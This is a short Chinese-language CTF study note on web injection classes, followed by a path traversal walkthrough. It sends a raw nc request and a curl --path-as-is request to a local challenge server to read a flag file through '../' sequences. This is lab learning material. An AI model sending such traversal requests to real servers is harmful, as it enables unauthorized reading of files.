#ctf/web 
安全领域有各种各样的注入：
- Command Injection
- HTML Injection
- SQL Injection
- Stack Injection

其核心在于利用精心构造的输入数据，嵌入到服务端程序想要执行的参数化命令中，并绕过参数检查，从而执行恶意指令。

## Path Traversal
当服务端直接通过拼接路径提供文件时，可以利用 `..` 实现对文件系统任意路径的访问。
```sh
hacker@web-security~path-traversal-1:~$ nc localhost 80
GET /deliverables/../../flag HTTP/1.1
Host: challenge.localhost:80
```

或者用 `curl`：
```sh
hacker@web-security~path-traversal-1:~$ curl --path-as-is -v challenge.localhost
:80/deliverables/../../flag
```

> [!note]
> 由于 `curl` 默认会自动处理 `/./` 和 `/../` 路径，发送请求前需要显式关闭。

